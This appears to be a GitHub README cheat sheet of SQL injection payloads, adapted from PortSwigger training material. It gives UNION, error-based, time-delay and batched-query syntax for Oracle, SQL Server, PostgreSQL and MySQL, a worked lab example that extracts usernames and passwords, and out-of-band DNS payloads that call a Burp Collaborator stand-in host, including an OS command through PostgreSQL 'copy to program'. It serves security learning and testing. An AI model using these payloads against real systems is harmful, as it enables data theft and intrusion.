# Sql injection cheat sheets (can be found also [here](https://portswigger.net/web-security/sql-injection/cheat-sheet))
This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. 

#
#

- ***Feel free to open Issue and suggest me cheatsheets to add or fix mistakes i made***
#
#

## How to detect SQL injection
*SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:*
-  Submitting the single quote character ``'`` and looking for errors or other anomalies.
-  Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
-  Submitting Boolean conditions such as ``OR 1=1`` and ``OR 1=2``, and looking for differences in the application's responses.
-  Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
-  Submitting [OAST](https://portswigger.net/burp/application-security-testing/oast) payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions. 

#

## SQL injection in different parts of the query
*Most SQL injection vulnerabilities arise within the ``WHERE`` clause of a ``SELECT`` query. This type of SQL injection is generally well-understood by experienced testers.
But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are: 

- In ``UPDATE`` statements, within the updated values or the ``WHERE`` clause.
- In ``INSERT`` statements, within the inserted values.
- In ``SELECT`` statements, within the table or column name.
- In ``SELECT`` statements, within the ``ORDER BY`` clause.

#

## Retrieving hidden data
*Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:*
``https://insecure-website.com/products?category=Gifts``
*This causes the application to make a SQL query to retrieve details of the relevant products from the database:*
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
 *This SQL query asks the database to return:*

- all details (*)
- from the products table
- where the category is Gifts
- and released is 1.

*The restriction ``released = 1`` is being used to hide products that are not released. For unreleased products, presumably ``released = 0``.*

***An attacker can construct an attack like:***
```sql
https://insecure-website.com/products?category=Gifts'--
```
***Going further,an attacker can cause the application to display all the products in any category, including categories that they don't know about:***
```sql
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
#### Summary 
``'`` <br>
``'--`` <br>
``'OR 1=1--`` & ``'+OR+1=1--`` <br>
``'OR 1=2--`` & ``'+OR+1=2--`` <br>

***etc..***

#
## UNION ATTACKS (TIP)
*In UNION attacks sometimes server applies only you input `#` or `--`.*
- Example, see the differences
```sql
' UNION SELECT NULL,NULL#
```
```sql
' UNION SELECT NULL,NULL--
```

#

## SQL injection examples
*There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:*

- [Retrieving hidden data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data), where you can modify a SQL query to return additional results.
- [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic), where you can change a query to interfere with the application's logic.
- [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks), where you can retrieve data from different database tables.
- [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), where the results of a query you control are not returned in the application's responses.

#

### In order to apply ***UNION*** commands with success we need to determine how many ***columns*** does the site/server uses
- See what server applies, `#` or `--`  // (**More info [here](https://github.com/th3knv/SQL_injection_cheatsheet/edit/main/README.md#union-attacks-tip)**)
```sql
` UNION SELECT NULL,NULL--
```
- And so on you add more `NULL` to test if needed. When you find the correct number of ***columns*** you will use them with the command you want to execute.
- Example, server needed 2 columns. I removed one column and replaced it with the command i want to execute. 
```sql
' UNION SELECT NULL,version()--
```
**Result:**
```sql
PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
```

***IF WE RUN*** the following command **without using the correct columns** you will see that you won't get any result or you may be blocked:
```sql
' UNION SELECT version()--
```
![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/168cccf6-ea84-4da5-8a47-5efac8021f8b)

#

## String concatenation
*You can concatenate together multiple strings to make a single string*

| Type | String |
| --- | --- |
| Oracle   | `'foo'\|\|'bar'` |
| Microsoft |  `'foo'+'bar'` |
| PostgreSQL | ` 'foo'\|\|'bar'`|
| MySQL | `'foo' 'bar'` <br> `CONCAT('foo','bar')`|

#

## Substring
*You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ``ba``.*

| Type | String |
| --- | --- |
| Oracle   | `SUBSTR('foobar', 4, 2)` |
| Microsoft |  `SUBSTR('foobar', 4, 2)` |
| PostgreSQL | `SUBSTR('foobar', 4, 2)`|
| MySQL | `SUBSTR('foobar', 4, 2)`| 

#

## Comments
*You can use comments to truncate a query and remove the portion of the original query that follows your input.*

| Type | String |
| --- | --- |
| Oracle   |` --comment` |
| Microsoft | `--comment` <br>` /*comment*/ ` |
| PostgreSQL | `--comment` <br>` /*comment*/ ` |
| MySQL | `-- comment` <br>` /*comment*/ ` <br>`#comment`

#

## Database version
*You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.*
### ***Dont  forget to add `' UNION` at the beggining and `--` at the end***


| Type | String |
| --- | --- |
| Oracle   | `SELECT banner FROM v$version` <br> `SELECT version FROM v$instance` |
| Microsoft |  `SELECT @@version ` |
| PostgreSQL | `SELECT version() `|
| MySQL | `SELECT @@version `| 

 - For example, you could use a ***UNION*** attack with the following input: 
```sql
' UNION SELECT @@version--
```
This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
```sql
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

#

## Database contents
*You can list the tables that exist in the database, and the columns that those tables contain.*

## `*`
> This Defines that you might have to add more columns in the code in order for code to work

### ***Dont  forget to add `' UNION` at the beggining and `--` at the end***
| Type | String |
| --- | --- |
| Oracle   | `SELECT table_name,* FROM all_tables` <br> `SELECT column_name,* FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL |  `SELECT table_name,* FROM information_schema.tables` <br> `SELECT column_name,* FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

 With `.tables` it returns output like the following: 
 ```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

With `.columns` and the **table name** it returns output like the following:
```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

- Example of **PostgreSQL** printing tables. In the following code, server applies 2 columns. We replace one of those with **table_name**. 
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
 ```

![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/5112fb40-80ba-4281-badf-31ab4289f463)

- Going deeper (**for PostgreSQL**) we can explore the content of the table. Searching up , we will find and use an interesting table name called `users_wvtyfp`
> As you can see (in the following command) server accepts 2 columns thats why i added ***NULL***

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_wvtyfp'--
```
![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/5fc0da1b-0814-4e6f-879d-b0702be3cf72)

Exploting this a bit more,
```sql
' UNION SELECT username_khsgkv, password_bzvrbj FROM users_wvtyfp--
```
![image](https://github.com/th3knv/SQL_injection_cheatsheet/assets/76121926/81ff21e1-defc-412d-b058-9f0a84a29965)

#

## Conditional errors
*You can test a single boolean condition and trigger a database error if the condition is true.*
### ***Dont  forget to add `' UNION` at the beggining and `--` at the end***


| Type | String |
| --- | --- |
| Oracle   | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft |  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`| 

#

## Extracting data via visible error messages
*You can potentially elicit error messages that leak sensitive data returned by your malicious query.*
### ***Dont  forget to add `' UNION` at the beggining and `--` at the end***


| Type | String |
| --- | --- |
| Microsoft   | `SELECT 'foo' WHERE 1 = (SELECT 'secret')` <br> > Conversion failed when converting the varchar value 'secret' to data type int. |
| PostgreSQL |  ` SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` <br> > invalid input syntax for integer: "secret" |
| MySQL | ` SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` <br> > XPATH syntax error: '\secret' |

#

## Batched (or stacked) queries
*You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.*

| Type | String |
| --- | --- |
| Oracle   | ~~Does not support batched queries.~~ |
| Microsoft |  ` QUERY-1-HERE; QUERY-2-HERE` |
| PostgreSQL | ` QUERY-1-HERE; QUERY-2-HERE `|
| MySQL | ` QUERY-1-HERE; QUERY-2-HERE `| 

- Note
> With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

#

## Time delays
*You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.*

| Type | String |
| --- | --- |
| Oracle   | ` dbms_pipe.receive_message(('a'),10) ` |
| Microsoft |  ` WAITFOR DELAY '0:0:10' ` |
| PostgreSQL | ` SELECT pg_sleep(10) `|
| MySQL | ` SELECT SLEEP(10) `|

#

## Conditional time delays
*You can test a single boolean condition and trigger a time delay if the condition is true.*

| Type | String |
| --- | --- |
| Oracle   | ` SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual `|
| Microsoft |  ` IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' ` |
| PostgreSQL | ` SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END `|
| MySQL | ` SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') `| 

#

## DNS Lookup
*You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.*

| Type | String |
| --- | --- |
| Oracle   | The following technique leverages an XML external entity [XXE](https://portswigger.net/web-security/xxe) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: <br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br> The following technique works on fully patched Oracle installations, but requires elevated privileges: <br> `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| Microsoft |  `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' ` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' `|
| MySQL | The following techniques work on Windows only <br> `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`| 

#

#
## More coming soon
